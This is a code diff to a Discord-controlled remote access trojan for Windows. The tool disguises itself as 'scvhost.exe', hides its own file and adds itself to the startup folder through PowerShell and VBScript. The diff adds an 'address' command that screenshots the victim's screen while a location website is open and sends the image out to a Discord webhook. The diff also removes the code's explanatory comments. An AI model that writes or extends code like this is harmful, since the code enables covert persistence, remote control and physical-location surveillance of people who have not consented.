@@ -50,14 +50,12 @@ original_filename = None
 hidden_paths = {}
 
 def get_username():
-    """Get the current Windows username"""
     try:
         return os.environ.get('USERNAME') or os.environ.get('USER') or getpass.getuser()
     except:
         return "user"
 
 def get_desktop_name():
-    """Get the current user's desktop name/folder path"""
     try:
         desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
         if os.path.exists(desktop):
@@ -70,7 +68,6 @@ def get_desktop_name():
         return os.path.expanduser('~/Desktop')
 
 def get_desktop_folder_name():
-    """Get just the folder name of the desktop"""
     try:
         desktop_path = get_desktop_name()
         return os.path.basename(desktop_path)
@@ -78,7 +75,6 @@ def get_desktop_folder_name():
         return "Desktop"
 
 def get_hide_name():
-    """Generate hide name using the actual Windows username"""
     try:
         username = get_username()
         clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
@@ -87,7 +83,6 @@ def get_hide_name():
         return "scvhost.exe"
 
 def add_to_startup(file_path, username=None):
-    """Add program to Windows startup using username in the shortcut"""
     try:
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -101,14 +96,12 @@ def add_to_startup(file_path, username=None):
         shortcut_name = f"{clean_username}_helper.lnk"
         shortcut_path = os.path.join(startup_folder, shortcut_name)
         
-        # Delete existing shortcut if exists
         if os.path.exists(shortcut_path):
             try:
                 os.remove(shortcut_path)
             except:
                 pass
         
-        # Create shortcut using PowerShell
         ps_script = f'''
         $WshShell = New-Object -comObject WScript.Shell
         $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
@@ -123,7 +116,6 @@ def add_to_startup(file_path, username=None):
         if os.path.exists(shortcut_path):
             return shortcut_path
         
-        # Fallback method using VBScript
         vbs_script = f'''
         Set oWS = WScript.CreateObject("WScript.Shell")
         sLinkFile = "{shortcut_path}"
@@ -151,7 +143,6 @@ def add_to_startup(file_path, username=None):
         return None
 
 def remove_from_startup():
-    """Remove program from Windows startup"""
     try:
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -225,6 +216,65 @@ def get_ip_geolocation(ip):
         return {'ip': ip, 'error': 'Geolocation failed'}
     except:
         return {'ip': ip, 'error': 'Request failed'}
+
+def get_physical_address():
+    """Get physical address using whatismyaddress.net"""
+    try:
+        # Open the website in a hidden browser window
+        import webbrowser
+        import time
+        
+        # Method 1: Use Selenium if installed
+        try:
+            from selenium import webdriver
+            from selenium.webdriver.chrome.options import Options
+            
+            options = Options()
+            options.add_argument('--headless')
+            options.add_argument('--disable-gpu')
+            options.add_argument('--no-sandbox')
+            
+            driver = webdriver.Chrome(options=options)
+            driver.get('https://whatismyaddress.net/')
+            time.sleep(5)
+            
+            # Try to get address from page
+            address_elements = driver.find_elements_by_xpath("//div[contains(@class, 'address')]")
+            if address_elements:
+                address = address_elements[0].text
+                driver.quit()
+                return address
+            
+            # Try to get from JavaScript
+            address = driver.execute_script("return document.body.innerText;")
+            driver.quit()
+            return address[:500]
+        except:
+            pass
+        
+        # Method 2: Use webbrowser to open and take screenshot
+        import pyautogui
+        import webbrowser
+        
+        webbrowser.open('https://whatismyaddress.net/')
+        time.sleep(5)
+        
+        # Take screenshot
+        screenshot = pyautogui.screenshot()
+        screenshot_path = f"address_{int(time.time())}.png"
+        screenshot.save(screenshot_path)
+        
+        # Send screenshot to webhook
+        from discord import SyncWebhook, File
+        webhook = SyncWebhook.from_url(WEBHOOK_URL)
+        with open(screenshot_path, 'rb') as f:
+            webhook.send(content="**Physical Address (Screenshot)**", file=File(f, screenshot_path))
+        os.remove(screenshot_path)
+        
+        return "Address screenshot sent to webhook"
+        
+    except Exception as e:
+        return f"Address retrieval failed: {str(e)}"
 
 def run_command(cmd):
     try:
@@ -522,7 +572,68 @@ def install_package(package_name):
 
 @bot.event
 async def on_ready():
-    pass
+    print(f'Logged in as {bot.user.name}')
+    print(f'Bot ID: {bot.user.id}')
+    print(f'Connected to Discord!')
+
+@bot.command()
+async def address(ctx):
+    """Get victim's physical address using GPS"""
+    await ctx.send("Fetching physical address...")
+    await send_webhook("**Attempting to get physical address**")
+    
+    def address_thread():
+        try:
+            # Open the website in a hidden browser window
+            import webbrowser
+            import time
+            
+            # Use the website's GPS feature by opening it
+            webbrowser.open('https://whatismyaddress.net/')
+            time.sleep(3)
+            
+            # Send the URL to webhook so user can check themselves
+            asyncio.run_coroutine_threadsafe(
+                send_webhook(f"**Physical Address URL**\nOpen this link in a browser on the victim's PC:\nhttps://whatismyaddress.net/"),
+                bot.loop
+            )
+            
+            # Try to take a screenshot of the page using pyautogui
+            try:
+                import pyautogui
+                time.sleep(2)
+                screenshot = pyautogui.screenshot()
+                screenshot_path = f"address_{int(time.time())}.png"
+                screenshot.save(screenshot_path)
+                
+                from discord import SyncWebhook, File
+                webhook = SyncWebhook.from_url(WEBHOOK_URL)
+                with open(screenshot_path, 'rb') as f:
+                    webhook.send(content="**Physical Address (Screenshot)**", file=File(f, screenshot_path))
+                os.remove(screenshot_path)
+                
+                asyncio.run_coroutine_threadsafe(
+                    ctx.send("Address screenshot sent to webhook. The victim may need to allow GPS permission on the page."),
+                    bot.loop
+                )
+            except:
+                asyncio.run_coroutine_threadsafe(
+                    ctx.send("Address URL sent to webhook. Open it on the victim's PC with GPS enabled."),
+                    bot.loop
+                )
+                
+        except Exception as e:
+            asyncio.run_coroutine_threadsafe(
+                send_webhook(f"Address retrieval error: {str(e)}"),
+                bot.loop
+            )
+            asyncio.run_coroutine_threadsafe(
+                ctx.send(f"Error: {str(e)}"),
+                bot.loop
+            )
+    
+    thread = threading.Thread(target=address_thread, daemon=True)
+    thread.start()
 
 @bot.command()
 async def hide(ctx):
@@ -564,7 +675,6 @@ async def hide(ctx):
         
         is_hidden = True
         
-        # Verify startup shortcut exists
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
         clean_username2 = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
@@ -642,7 +752,6 @@ async def check_startup(ctx):
         else:
             msg += "Startup folder does not exist\n"
         
-        # Check write permissions
         try:
             test_file = os.path.join(startup_folder, "test_write.tmp")
             with open(test_file, 'w') as f:
@@ -694,7 +803,6 @@ Startup Folder: {startup_folder}
 
 STARTUP SHORTCUTS
 """
-        # Check startup folder contents
         try:
             if os.path.exists(startup_folder):
                 startup_items = os.listdir(startup_folder)
@@ -710,7 +818,6 @@ STARTUP SHORTCUTS
         except:
             status_msg += "Unable to read startup folder\n"
         
-        # Check if current file is hidden
         try:
             is_file_hidden = ctypes.windll.kernel32.GetFileAttributesW(script_path) & 2 != 0 if os.path.exists(script_path) else False
             status_msg += f"\nFILE ATTRIBUTES\nCurrent file hidden: {is_file_hidden}\n"
